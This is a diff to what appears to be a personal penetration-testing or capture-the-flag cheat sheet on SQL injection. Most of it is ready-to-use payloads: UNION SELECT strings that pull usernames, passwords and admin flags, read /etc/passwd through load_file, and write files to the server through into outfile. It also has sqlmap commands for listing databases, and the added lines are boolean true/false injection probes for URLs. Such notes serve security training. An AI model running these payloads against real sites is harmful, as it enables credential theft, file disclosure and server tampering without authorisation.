@@ -147,6 +147,12 @@ sudo openvpn nmap -sV {target IP}
 - union select 1,username,password,is_admin,5 from accounts%23 ---extract sensitive information
 - union select null,load_file('/etc/passwd'),null,null,null%23 ---get /etc/passwd files
 - union select null,'example example',null,null,null into outfile '/tmp/example.txt'%23 --write to server
+[+] test if user input on URL can reflect on page
+[+] {'+and+1=1--} --test TRUE in URL
+[+] {'+and+1=0--} --test FASLE in URL
+
+
+
 
 [+] Dsicover SQL vul by running {sqlmap -u "url"}
 - sqlmap -u "url" --dbs    --to get current database
